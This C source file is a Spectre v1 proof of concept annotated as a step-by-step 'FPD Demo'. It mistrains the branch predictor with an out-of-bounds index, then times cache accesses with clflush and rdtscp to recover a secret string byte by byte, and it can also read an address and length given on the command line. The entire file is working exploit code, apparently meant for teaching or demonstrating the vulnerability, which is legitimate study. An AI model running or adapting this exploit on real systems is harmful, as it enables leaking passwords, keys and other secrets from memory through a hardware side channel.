#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64]; 
uint8_t array2[256 * 512];

// secret value to leak
char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x) {
	// ******** FPD Demo ********
	// Spectre v1 code
	// Step 5: Access a secret dependent cache line
	// An out of bounds 'x' would bring in a secret dependent cache line as the branch predictor is mistrained previously
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
}


/********************************************************************
Analysis code
********************************************************************/

// ******** FDP Demo *******
// This number is obtained after a calibration step
#define CACHE_HIT_THRESHOLD (80)  
// Assume cache hit if time <= threshold

// Report best guess in value[0] and runner-up in value[1] 
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	// Initialise the results array
	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = 999; tries > 0; tries--) {

		// Flush array2[256*(0..255)] from cache
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]);  

		training_x = tries % array1_size;

		// ******** FPD Demo ********
		// Step 3: Mis-train the branch predictor
		// 30 loops: For 5 training runs x=training_x, and for 6th run x=malicious_x	
		for (j = 29; j >= 0; j--) {

			// Flush array1_size from cache
			_mm_clflush(&array1_size);

			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			
			// ******** FPD Demo ********
			// Step 4: Call the victim function with the a distance of offset from array1
			// Call the victim! 
			victim_function(x);
		}

		// ******** FPD Demo ********
		// Step 6: Time the cache accesses for all indexes of array2(less time would represent cache hit)
		// Time reads. Order is lightly mixed up to prevent stride prediction 
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk);            /* READ TIMER */
			junk = *addr;                       /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */

		
			// ******** FPD Demo ********
			// Step 7: Find time for the byte value which would get a hit(represents the secret byte)
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++;  // cache hit - add +1 to score for this value
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk;  /* use junk so code above won't get optimized out*/

	// Track corresponding score for the highest probable and second highest probable secret byte inferred 
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char **argv) {
	// ******** FPD Demo ********
	// Step 1: Find the offset of the secret byte from array1
	// "malicious_x" represents the offset of secret byte from the array1's base address
	size_t malicious_x=(size_t)(secret-(char*)array1);   
	int i, score[2], len=40;
	uint8_t value[2];

	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1;    // write to array2 so in RAM not copy-on-write zero pages
	if (argc == 3) {
		sscanf(argv[1], "%p", (void**)(&malicious_x));
		malicious_x -= (size_t)array1;  // Convert input value into a pointer
		sscanf(argv[2], "%d", &len);
	}
	
	printf("Reading %d bytes:\n", len);

	// ******** FPD Demo ********
	// Step 2: Run the loop for the length of the secret array no. of times
	// and in each iteration of the loop we encode the secret byte and infer it
	while (--len >= 0) {
		printf("Reading at malicious_x = %ld... ", malicious_x);
		readMemoryByte(malicious_x++, value, score);

		// ******** FPD Demo ********
		// Step 8: Report secret byte and their corresponding score values for the highest and second highest inferred byte
		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d    ", value[0], 
            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
	}
	return (0);
}
